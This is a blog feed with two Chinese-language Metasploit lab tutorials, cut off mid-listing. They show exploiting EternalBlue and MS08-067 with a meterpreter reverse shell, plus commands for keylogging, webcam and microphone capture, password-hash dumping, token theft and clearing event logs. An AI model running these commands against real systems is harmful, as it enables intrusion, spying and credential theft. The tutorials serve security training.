<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>GZ&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://gz1903.github.io/"/>
  <updated>2019-10-28T03:42:51.876Z</updated>
  <id>https://gz1903.github.io/</id>
  
  <author>
    <name>GZ</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Metasploit--永恒之蓝</title>
    <link href="https://gz1903.github.io/2019/10/26/Metasploit-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    <id>https://gz1903.github.io/2019/10/26/Metasploit-永恒之蓝/</id>
    <published>2019-10-26T09:57:47.000Z</published>
    <updated>2019-10-28T03:42:51.876Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="简介"><a href="#简介" class="headerlink" title="简介:"></a>简介:</h1><p>勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极 大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解 密，必须拿到解密的私钥才有可能破解。<br>永恒之蓝是指2017年5月12日起，全球范围内爆发的基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，不 法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。英国、俄罗斯、整个欧洲 以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。<br>通过该实验，体验勒索病毒利用MS17-010系统漏洞获取远程主机管理员权限的过程，掌握系统运维中如何加强安 全防护措施来防止永恒之蓝病毒。</p><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1572058329492/0" class="lozad"></p><h1 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h1><p>目标靶机：windows7（存在MS17-010漏洞）</p><p>测试渗透机：<a href="https://images.oﬀensive-security.com/virtual-images/kali-linux-2018.2-vm-amd64.zip" target="_blank" rel="noopener">Kali-Linux-2018.2-vm-amd64</a>（Metasploit平台）</p><h1 id="实验原理："><a href="#实验原理：" class="headerlink" title="实验原理："></a>实验原理：</h1><p>基于metasploit渗透平台，调用永恒之蓝攻击模块，将远程渗透攻击模式设置为reverse_tcp模式，攻击成功后获 取远程主机的系统权限。</p><h1 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h1><h2 id="打开-Metasploit"><a href="#打开-Metasploit" class="headerlink" title="打开 Metasploit"></a>打开 Metasploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><blockquote><p>Metasploit是一款开源的渗透测试框架平台，到目前为止，msf已经内置了数千个已披露的漏洞相关的模块和渗透测试 工具，模块使用ruby语言编写，这使得使用者能够根据需要对模块进行适当修改，甚至是调用自己写的测试模块。选定 需要使用的攻击模块之后，你只需要使用简单的命令配置一些参数就能完成针对一个漏洞的测试和利用，将渗透的过程 自动化、简单化。 </p></blockquote><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1231832914_1572075378253/0" class="lozad"></p><h2 id="启用永恒之蓝攻击模块"><a href="#启用永恒之蓝攻击模块" class="headerlink" title="启用永恒之蓝攻击模块"></a>启用永恒之蓝攻击模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1902836701_1572075584569/0" class="lozad"></p><h2 id="设置靶机IP"><a href="#设置靶机IP" class="headerlink" title="设置靶机IP"></a>设置靶机IP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhost 【目标靶机】</span><br></pre></td></tr></table></figure><h2 id="设置-payload："><a href="#设置-payload：" class="headerlink" title="设置 payload："></a>设置 payload：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h2 id="设置本机地址："><a href="#设置本机地址：" class="headerlink" title="设置本机地址："></a>设置本机地址：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 【测试渗透机】</span><br></pre></td></tr></table></figure><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1231832914_1572075670053/0" class="lozad"></p><blockquote><p>执行攻击命令 run 等待2-4分钟，即可获得靶机shell</p></blockquote><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1231832914_1572075739220/0" class="lozad"></p><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1902836701_1572075861657/0" class="lozad"></p><h2 id="渗透利用"><a href="#渗透利用" class="headerlink" title="渗透利用"></a>渗透利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">meterpreter核心命令</span><br><span class="line">=============</span><br><span class="line">? / help                  显示帮助菜单 </span><br><span class="line">background               将此会话放进后台（回话依然存在，这样可以使用其他模块利用此session来做更多事）</span><br><span class="line">bgkill                    杀死一个后台会话</span><br><span class="line">bglist                    显示后台运行的脚本</span><br><span class="line">bgrun                     运行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                   显示频道里信息或者控制频道</span><br><span class="line">close                     关闭频道</span><br><span class="line">exit / quit               终止meterpreter会话</span><br><span class="line">get_timeouts              得到当前回话的超时值</span><br><span class="line">info                      显示关于选定模块的信息</span><br><span class="line">irb                       进入rb脚本模式</span><br><span class="line">load                      载入一个或多个meterpreter扩展</span><br><span class="line">machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">migrate                   迁移攻击载荷到指定的pid或者进程名(默认pid，-N name进程名)</span><br><span class="line">read / write              从一个频道读取/写入数据</span><br><span class="line">resource                  运行一个资源文件（类似批处理脚本）</span><br><span class="line">run                       运行一个meterpreter脚本或模块</span><br><span class="line">set_timeouts              设置当前模块连接超时值</span><br><span class="line">sleep                     强制meterpreter去什么都不做再重新连接</span><br><span class="line">transport                 改变当前传输机制（后续发）</span><br><span class="line">use                       改变load的别名</span><br><span class="line">uuid                      获取当前的uuid</span><br><span class="line">文件命令(和Linux几乎一致)</span><br><span class="line">============================</span><br><span class="line">cat           把一个文件内容输出到屏幕（查看文件内容）</span><br><span class="line">cd            移动到其他目录</span><br><span class="line">download      下载一个文件或目录</span><br><span class="line">Usage: download [options] src1 src2 src3 ... destination</span><br><span class="line">OPTIONS:</span><br><span class="line">-r        递归下载所有内容</span><br><span class="line">-t        时间戳也要下载</span><br><span class="line">edit          编辑一个文件（和vim操作类似）</span><br><span class="line">lpwd           查看本地目录</span><br><span class="line">getwd         查看远程目录</span><br><span class="line">lcd           改变本地工作目录</span><br><span class="line">ls            列出文件</span><br><span class="line">mkdir         创建目录</span><br><span class="line">mv            移动</span><br><span class="line">pwd           显示当前工作目录</span><br><span class="line">rm            删除</span><br><span class="line">rmdir         删除目录</span><br><span class="line">search        搜素</span><br><span class="line">show_mount    列出所有设备（磁盘）</span><br><span class="line">upload        上传文件或目录（-r 地柜上传）</span><br><span class="line">网络命令</span><br><span class="line">===========================</span><br><span class="line">arp          显示ARP缓存表</span><br><span class="line">getproxy      显示代理设置</span><br><span class="line">ifconfig      显示网卡设置</span><br><span class="line">ipconfig      显示网卡设置</span><br><span class="line">netstat       显示网络连接状态</span><br><span class="line">portfwd       指向一个本地端口到远程服务（端口转发，后续会发）</span><br><span class="line">route         显示(修改)受害主机路由表</span><br><span class="line">Supported commands:</span><br><span class="line">   add    [subnet] [netmask] [gateway]</span><br><span class="line">   delete [subnet] [netmask] [gateway]</span><br><span class="line">   list</span><br><span class="line">系统命令</span><br><span class="line">=======================</span><br><span class="line">clearev        清除事件日志（系统自带的日志）</span><br><span class="line">drop_token    放弃所有的假冒令牌</span><br><span class="line">execute       执行一条命令（后续发）</span><br><span class="line">getenv        取得指定的一个或多环境变量的值</span><br><span class="line">getpid        得到当前进程的pid（攻击shell的pid）</span><br><span class="line">getprivs      尝试获取所有特权      </span><br><span class="line">getsid        Get the SID of the user that the server is running as</span><br><span class="line">getuid        显示当前的身份</span><br><span class="line">kill          杀死一个进程，后接pid，参数-s杀死相关的进程</span><br><span class="line">ps            列出目标主机的进程</span><br><span class="line">reboot        重启目标主机</span><br><span class="line">shutdown      关闭目标主机</span><br><span class="line">reg          修改注册表，可查看帮助（后续发）</span><br><span class="line">rev2self      回到目标主机的初始用户账户下（例如开始是admin后来提权为system，可以回到admin）</span><br><span class="line">shell         使用Windows系统命令行</span><br><span class="line">steal_token   尝试盗取一个令牌</span><br><span class="line">suspend      暂停或恢复一个列表进程</span><br><span class="line">sysinfo       取得目标主机的系统信息，含电脑名，操作系统，架构，语言，工作组，登录用户数</span><br><span class="line">用户界面命令</span><br><span class="line">===============================</span><br><span class="line">enumdesktops   列举出目标主机上所有的桌面</span><br><span class="line">idletime       返回目标主机已经被闲置了多少时间</span><br><span class="line">keyscan_dump   得到键盘录制的内容</span><br><span class="line">keyscan_start  开始键盘录制</span><br><span class="line">keyscan_stop   停止键盘录制</span><br><span class="line">screenshot     抓取屏幕截图</span><br><span class="line">setdesktop     切换到其他用户界面【当有多个用户登录时】</span><br><span class="line">uictl          控制用户的键盘，鼠标</span><br><span class="line">网络摄像头命令</span><br><span class="line">=======================</span><br><span class="line">record_mic     从默认的录入设备记录x秒的音频</span><br><span class="line">OPTIONS:</span><br><span class="line">    -d &lt;opt&gt;  记录几秒，默认1s</span><br><span class="line">    -f &lt;opt&gt;  保存路径，默认：&apos;/root/[randomname].wav&apos;</span><br><span class="line">    -p &lt;opt&gt;  自动播放捕获到的音频，默认：true</span><br><span class="line">webcam_chat    开启一个视频聊天</span><br><span class="line">webcam_list    显示设备列表</span><br><span class="line">webcam_snap    从指定的设备拍照截图</span><br><span class="line">webcam_stream  从指定的webcam播放视频流</span><br><span class="line">权限提升</span><br><span class="line">======================</span><br><span class="line">getsystem     尝试提升用户权限</span><br><span class="line">密码数据库</span><br><span class="line">================================</span><br><span class="line">hashdump      下载密码哈希值（sam库）</span><br><span class="line">文件属性</span><br><span class="line">timestomp     修改文件的属性（后续发）</span><br></pre></td></tr></table></figure><h3 id="VNC远程桌面"><a href="#VNC远程桌面" class="headerlink" title="VNC远程桌面"></a>VNC远程桌面</h3><p>开启目标的远程桌面3389</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run vnc</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run screen_unlock</span><br></pre></td></tr></table></figure><h3 id="打开靶机的-cmd"><a href="#打开靶机的-cmd" class="headerlink" title="打开靶机的 cmd"></a>打开靶机的 cmd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p> excute              执行目标系统中的文件(-f 指定文件，-i执行可交互模式，-H隐藏窗口)</p><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1231832914_1572075964521/0" class="lozad"></p><p>更多操作，请参考 <a href="https://www.gz1903.club/2019/10/25/Metasploit/" target="_blank" rel="noopener">Metasploit</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Kali" scheme="https://gz1903.github.io/categories/Kali/"/>
    
      <category term="Metasploit" scheme="https://gz1903.github.io/categories/Kali/Metasploit/"/>
    
      <category term="永恒之蓝" scheme="https://gz1903.github.io/categories/Kali/Metasploit/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    
    
      <category term="Kali" scheme="https://gz1903.github.io/tags/Kali/"/>
    
      <category term="Metasploit" scheme="https://gz1903.github.io/tags/Metasploit/"/>
    
      <category term="永恒之蓝" scheme="https://gz1903.github.io/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit</title>
    <link href="https://gz1903.github.io/2019/10/25/Metasploit/"/>
    <id>https://gz1903.github.io/2019/10/25/Metasploit/</id>
    <published>2019-10-25T08:59:55.000Z</published>
    <updated>2019-10-28T03:42:51.332Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><hr><blockquote><p>Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为Metasploit团队一直都在努力开发各种攻击工具，并将它们贡献给所有Metasploit用户。<br>Metasploit的设计初衷是打造成一个攻击工具开发平台，本书稍后将讲解如何开发攻击工具。然而在目前情况下，安全专家以及业余安全爱好者更多地将其当作一种点几下鼠标就可以利用其中附带的攻击工具进行成功攻击的环境。 –百度百科</p></blockquote><p>先来看看他的基础架构：<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_142409441_1571988370103/0" class="lozad"><br>呐，这样，从右边看，他有很多用户接口，最常用的就是前面两个，现在先来分别介绍下Console，后续部分主要使用的接口，直接使用msfconsole进入<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_216703492_1571988428123/0" class="lozad"></p><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_265838824_1571988514860/0" class="lozad"><br>它的目录结构为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── app</span><br><span class="line">│   ├── concerns</span><br><span class="line">│   └── validators</span><br><span class="line">├── config</span><br><span class="line">│   ├── application.rb</span><br><span class="line">│   ├── boot.rb</span><br><span class="line">│   ├── cucumber.yml</span><br><span class="line">│   ├── database.yml                     #数据库配置文件</span><br><span class="line">│   ├── database.yml.example</span><br><span class="line">│   ├── database.yml.travis</span><br><span class="line">│   ├── database.yml.vagrant</span><br><span class="line">│   ├── environment.rb</span><br><span class="line">│   └── environments</span><br><span class="line">├── data                             #含有多种模块</span><br><span class="line">│   ├── cpuinfo</span><br><span class="line">│   ├── eicar.com</span><br><span class="line">│   ├── eicar.txt</span><br><span class="line">│   ├── emailer_config.yaml</span><br><span class="line">│   ├── exploits</span><br><span class="line">│   ├── flash_detector</span><br><span class="line">│   ├── ipwn</span><br><span class="line">│   ├── isight.bundle</span><br><span class="line">│   ├── john.conf</span><br><span class="line">│   ├── js</span><br><span class="line">│   ├── lab</span><br><span class="line">│   ├── logos</span><br><span class="line">│   ├── markdown_doc</span><br><span class="line">│   ├── meterpreter</span><br><span class="line">│   ├── mime.yml</span><br><span class="line">│   ├── msfcrawler</span><br><span class="line">│   ├── msfpescan</span><br><span class="line">│   ├── passivex</span><br><span class="line">│   ├── php</span><br><span class="line">│   ├── post</span><br><span class="line">│   ├── ropdb</span><br><span class="line">│   ├── snmp</span><br><span class="line">│   ├── sounds</span><br><span class="line">│   ├── templates                      #含有多种模板</span><br><span class="line">│   ├── vncdll.x64.dll</span><br><span class="line">│   ├── vncdll.x86.dll</span><br><span class="line">│   ├── webcam</span><br><span class="line">│   ├── wmap</span><br><span class="line">│   └── wordlists                       #含有多种字典</span><br><span class="line">├── db</span><br><span class="line">│   ├── migrate</span><br><span class="line">│   └── schema.rb</span><br><span class="line">├── Gemfile</span><br><span class="line">├── Gemfile.lock</span><br><span class="line">├── lib</span><br><span class="line">│   ├── anemone</span><br><span class="line">│   ├── anemone.rb</span><br><span class="line">│   ├── enumerable.rb</span><br><span class="line">│   ├── metasm</span><br><span class="line">│   ├── metasploit</span><br><span class="line">│   ├── msf</span><br><span class="line">│   ├── msfenv.rb</span><br><span class="line">│   ├── net</span><br><span class="line">│   ├── postgres</span><br><span class="line">│   ├── postgres_msf.rb</span><br><span class="line">│   ├── rabal</span><br><span class="line">│   ├── rapid7</span><br><span class="line">│   ├── rbmysql</span><br><span class="line">│   ├── rbmysql.rb</span><br><span class="line">│   ├── rex</span><br><span class="line">│   ├── rex.rb</span><br><span class="line">│   ├── snmp</span><br><span class="line">│   ├── snmp.rb</span><br><span class="line">│   ├── sqlmap</span><br><span class="line">│   ├── tasks</span><br><span class="line">│   ├── telephony</span><br><span class="line">│   ├── telephony.rb</span><br><span class="line">│   └── windows_console_color_support.rb</span><br><span class="line">├── metasploit-framework.gemspec</span><br><span class="line">├── modules                            #主要模块目录，可以看见6大模块。。。</span><br><span class="line">│   ├── auxiliary</span><br><span class="line">│   ├── encoders</span><br><span class="line">│   ├── exploits</span><br><span class="line">│   ├── nops</span><br><span class="line">│   ├── payloads</span><br><span class="line">│   └── post</span><br><span class="line">├── msfbinscan                           #这里是一些命令，可以单独拿出来使用</span><br><span class="line">├── msfconsole</span><br><span class="line">├── msfd</span><br><span class="line">├── msfdb</span><br><span class="line">├── msfelfscan</span><br><span class="line">├── msfmachscan</span><br><span class="line">├── msfpescan</span><br><span class="line">├── msfrop</span><br><span class="line">├── msfrpc</span><br><span class="line">├── msfrpcd</span><br><span class="line">├── msfupdate</span><br><span class="line">├── msfvenom</span><br><span class="line">├── plugins                            #多种插件，可通过载入插件来连接外部程序，扩充自己功能</span><br><span class="line">│   ├── alias.rb</span><br><span class="line">│   ├── auto_add_route.rb</span><br><span class="line">│   ├── beholder.rb</span><br><span class="line">│   ├── db_credcollect.rb</span><br><span class="line">│   ├── db_tracker.rb</span><br><span class="line">│   ├── event_tester.rb</span><br><span class="line">│   ├── ffautoregen.rb</span><br><span class="line">│   ├── ips_filter.rb</span><br><span class="line">│   ├── lab.rb</span><br><span class="line">│   ├── msfd.rb</span><br><span class="line">│   ├── msgrpc.rb</span><br><span class="line">│   ├── nessus.rb</span><br><span class="line">│   ├── nexpose.rb</span><br><span class="line">│   ├── openvas.rb</span><br><span class="line">│   ├── pcap_log.rb</span><br><span class="line">│   ├── request.rb</span><br><span class="line">│   ├── sample.rb</span><br><span class="line">│   ├── session_tagger.rb</span><br><span class="line">│   ├── socket_logger.rb</span><br><span class="line">│   ├── sounds.rb</span><br><span class="line">│   ├── sqlmap.rb</span><br><span class="line">│   ├── thread.rb</span><br><span class="line">│   ├── token_adduser.rb</span><br><span class="line">│   ├── token_hunter.rb</span><br><span class="line">│   ├── wiki.rb</span><br><span class="line">│   └── wmap.rb</span><br><span class="line">├── Rakefile</span><br><span class="line">├── ruby</span><br><span class="line">├── scripts                    #含有大量脚本，在后渗透测试阶段使用</span><br><span class="line">│   ├── meterpreter</span><br><span class="line">│   ├── ps</span><br><span class="line">│   ├── resource</span><br><span class="line">│   └── shell</span><br><span class="line">├── tools                      #有多种可单独使用的工具</span><br><span class="line">│   ├── context</span><br><span class="line">│   ├── dev</span><br><span class="line">│   ├── exploit</span><br><span class="line">│   ├── memdump</span><br><span class="line">│   ├── modules</span><br><span class="line">│   ├── password</span><br><span class="line">│   └── recon</span><br><span class="line">└── vendor</span><br><span class="line">    └── bundle</span><br></pre></td></tr></table></figure><h2 id="总体流程"><a href="#总体流程" class="headerlink" title="总体流程"></a>总体流程</h2><hr><p>这是最基本的使用流程，攻击成功后想干嘛随意。</p><h3 id="扫描目标"><a href="#扫描目标" class="headerlink" title="扫描目标"></a>扫描目标</h3><p>可以使用内置模块，也可以使用其他的扫描程序，这里使用nmap<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_142409441_1571988615166/0" class="lozad"><br>-sS是隐秘扫描，-Pn是假设主机存活，直接扫描。结果看到打开的端口和运行的服务。如果需要更多信息可以用-A<br><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_265838824_1571988682176/0" class="lozad"></p><h3 id="使用漏洞利用模块"><a href="#使用漏洞利用模块" class="headerlink" title="使用漏洞利用模块"></a>使用漏洞利用模块</h3><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1271937727_1571988718667/0" class="lozad"><br>这里使用了最简单的，权限最高的ms08_067漏洞，为什么用这个？不用管，为了学习后续操作，因为这个最简单呀。</p><h3 id="查看需要设置的参数"><a href="#查看需要设置的参数" class="headerlink" title="查看需要设置的参数"></a>查看需要设置的参数</h3><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1271937727_1571988754161/0" class="lozad"><br>这里要填写rhost的参数</p><h3 id="设置参数"><a href="#设置参数" class="headerlink" title="设置参数"></a>设置参数</h3><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_216703492_1571988789336/0" class="lozad"></p><h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571988804549/0" class="lozad"><br>因为这里用的payload是meterpreter，所以利用成功后就可以得到这个，这时就可以进行很多操作了，具体哪些可以看上一篇meterpreter常用命令，这里就介绍一点</p><h3 id="查看目标的进程"><a href="#查看目标的进程" class="headerlink" title="查看目标的进程"></a>查看目标的进程</h3><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571990379537/0" class="lozad"></p><h3 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h3><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571990433854/0" class="lozad"></p><h3 id="使用摄像头"><a href="#使用摄像头" class="headerlink" title="使用摄像头"></a>使用摄像头</h3><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_267840583_1571990453530/0" class="lozad"><br>先查看有没有摄像头</p><h4 id="拍照"><a href="#拍照" class="headerlink" title="拍照"></a>拍照</h4><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1333245325_1571990477306/0" class="lozad"></p><h4 id="实时监控"><a href="#实时监控" class="headerlink" title="实时监控"></a>实时监控</h4><blockquote><p>会在浏览器中打开播放窗口</p></blockquote><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_267840583_1571990510356/0" class="lozad"></p><h3 id="下载系统账户的哈希"><a href="#下载系统账户的哈希" class="headerlink" title="下载系统账户的哈希"></a>下载系统账户的哈希</h3><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571990528045/0" class="lozad"></p><h3 id="打开Windows的shell"><a href="#打开Windows的shell" class="headerlink" title="打开Windows的shell"></a>打开Windows的shell</h3><p><img alt data-src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571990546499/0" class="lozad"></p><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><hr><h3 id="msfdb"><a href="#msfdb" class="headerlink" title="msfdb"></a>msfdb</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfdb</span><br><span class="line">#用于管理msf数据库的命令</span><br><span class="line"> </span><br><span class="line">  msfdb init    # 初始化数据库，第一次使用msf时使用</span><br><span class="line">  msfdb reinit  # 重新初始化数据库，把数据库弄乱时使用</span><br><span class="line">  msfdb delete  